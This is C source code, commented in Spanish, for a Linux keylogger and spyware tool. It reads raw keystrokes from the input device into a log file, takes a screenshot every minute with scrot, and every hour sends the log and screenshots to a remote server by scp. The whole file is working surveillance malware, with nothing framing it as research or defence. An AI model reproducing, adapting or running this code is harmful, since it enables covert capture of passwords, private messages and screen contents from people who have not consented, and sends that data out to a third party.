#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <pthread.h>
#include <time.h>

// Función para obtener la tecla y su valor correspondiente
const char* get_key(int code) {
    switch(code) {
        case KEY_A: return "a";
        case KEY_B: return "b";
        case KEY_C: return "c";
        case KEY_D: return "d";
        case KEY_E: return "e";
        case KEY_F: return "f";
        case KEY_G: return "g";
        case KEY_H: return "h";
        case KEY_I: return "i";
        case KEY_J: return "j";
        case KEY_K: return "k";
        case KEY_L: return "l";
        case KEY_M: return "m";
        case KEY_N: return "n";
        case KEY_O: return "o";
        case KEY_P: return "p";
        case KEY_Q: return "q";
        case KEY_R: return "r";
        case KEY_S: return "s";
        case KEY_T: return "t";
        case KEY_U: return "u";
        case KEY_V: return "v";
        case KEY_W: return "w";
        case KEY_X: return "x";
        case KEY_Y: return "y";
        case KEY_Z: return "z";
        case KEY_1: return "1";
        case KEY_2: return "2";
        case KEY_3: return "3";
        case KEY_4: return "4";
        case KEY_5: return "5";
        case KEY_6: return "6";
        case KEY_7: return "7";
        case KEY_8: return "8";
        case KEY_9: return "9";
        case KEY_0: return "0";
        case KEY_KP0: return "0";
        case KEY_KP1: return "1";
        case KEY_KP2: return "2";
        case KEY_KP3: return "3";
        case KEY_KP4: return "4";
        case KEY_KP5: return "5";
        case KEY_KP6: return "6";
        case KEY_KP7: return "7";
        case KEY_KP8: return "8";
        case KEY_KP9: return "9";
        case KEY_KPENTER: return "\n";
        case KEY_KPDOT: return ".";
        case KEY_KPMINUS: return "-";
        case KEY_KPPLUS: return "+";
        case KEY_KPASTERISK: return "*";
        case KEY_KPSLASH: return "/";
        case KEY_ENTER: return "\n";    
        case KEY_SPACE: return " ";     
        case KEY_DOT: return ".";       
        case KEY_COMMA: return ",";     
        case KEY_MINUS: return "-";     
        case KEY_EQUAL: return "=";     
        case KEY_LEFTSHIFT: return " LEFTSHIFT ";
        case KEY_RIGHTSHIFT: return " RIGHTSHIFT ";
        case KEY_LEFTCTRL: return " LEFTCTRL ";
        case KEY_RIGHTCTRL: return " RIGHTCTRL ";
        case KEY_LEFTALT: return " LEFTALT ";
        case KEY_RIGHTALT: return " RIGHTALT ";
        case KEY_LEFT: return " LEFT ";
        case KEY_RIGHT: return " RIGHT ";
        case KEY_UP: return " UP ";
        case KEY_DOWN: return " DOWN ";
        case KEY_ESC: return " ESC ";
        case KEY_TAB: return " TAB ";
        case KEY_CAPSLOCK: return " CAPSLOCK ";
        case KEY_BACKSPACE: return " BACKSPACE ";
        case KEY_F1: return " F1 ";
        case KEY_F2: return " F2 ";
        case KEY_F3: return " F3 ";
        case KEY_F4: return " F4 ";
        case KEY_F5: return " F5 ";
        case KEY_F6: return " F6 ";
        case KEY_F7: return " F7 ";
        case KEY_F8: return " F8 ";
        case KEY_F9: return " F9 ";
        case KEY_F10: return " F10 ";
        case KEY_F11: return " F11 ";
        case KEY_F12: return " F12 ";
        default: return "";  // Valor nulo por default para teclas no declaradas
    }
}

// Función para detectar las pulsaciones de teclas
void* capture_keystrokes(void* arg) {
    struct input_event ev;
    ssize_t n;
    int f;
    FILE *logger_file;

    // Abre el archivo del teclado
    f = open("/dev/input/event0", O_RDONLY);
    if (f == -1) {
        perror("Error: No se puede abrir el dispositivo de entrada");
        return NULL;
    }

    // Abre el archivo para guardar los registros
    logger_file = fopen("keylogger.txt", "a");
    if (logger_file == NULL) {
        perror("Error: No se puede abrir el archivo de registro");
        close(f);
        return NULL;
    }

    // Bucle para leer las pulsaciones de teclas
    while (1) {
        n = read(f, &ev, sizeof(ev));
        if (n == (ssize_t)-1) {
            perror("Error al leer del dispositivo");
            break;
        } else if (n != sizeof(ev)) {
            fprintf(stderr, "Error de lectura incompleta\n");
            break;
        }

        // Filtra solo los eventos de teclas y solo cuando se detecta un pulsación
        if (ev.type == EV_KEY && ev.value == 1) {
            const char* key_name = get_key(ev.code);
            if (*key_name) {
                fprintf(logger_file, "%s", key_name);
                fflush(logger_file);
            }
        }
    }

    // Cierra los archivos abiertos para evitar errores
    fclose(logger_file);
    close(f);

    return NULL;
}

// Función para tomar capturas de pantalla
void* take_screenshots(void* arg) {
    while (1) {
        char filename[100];
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);

        // Configurar el nombre del archivo con la fecha y hora actual para evitar problemas de sobrescritura
        snprintf(filename, sizeof(filename), "screenshot_%04d-%02d-%02d_%02d-%02d-%02d.png",
                 tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday,
                 tm.tm_hour, tm.tm_min, tm.tm_sec);

        // Toma la captura de pantalla
        char command[150];
        snprintf(command, sizeof(command), "scrot %s", filename);
        system(command);

        sleep(60);  // Contador de los 60 segundos (1 minuto)
    }

    return NULL;
}

// Función para transferir archivos al servidor
void* transfer_files(void* arg) {
    while (1) {
        // Contador de 1 hora (3600 segundos)
        sleep(3600);

        // Transfiere los archivos al servidor
        char command[200];
        snprintf(command, sizeof(command), "scp keylogger.txt screenshot_*.png user@server:/path/to/destination/");
        
        system(command);
    }

    return NULL;
}

int main() {
    pthread_t keystroke_thread, screenshot_thread, transfer_thread;

    // Hilo para el keylogger
    if (pthread_create(&keystroke_thread, NULL, capture_keystrokes, NULL) != 0) {
        perror("Error al crear el hilo de captura de teclas");
        return EXIT_FAILURE;
    }

    // Hilo para tomar capturas de pantalla
    if (pthread_create(&screenshot_thread, NULL, take_screenshots, NULL) != 0) {
        perror("Error al crear el hilo de captura de pantalla");
        return EXIT_FAILURE;
    }

    // Hilo para transferir los archivos al servidor
    if (pthread_create(&transfer_thread, NULL, transfer_files, NULL) != 0) {
        perror("Error al crear el hilo de transferencia de archivos");
        return EXIT_FAILURE;
    }

    pthread_join(keystroke_thread, NULL);
    pthread_join(screenshot_thread, NULL);
    pthread_join(transfer_thread, NULL);

    return EXIT_SUCCESS;
}

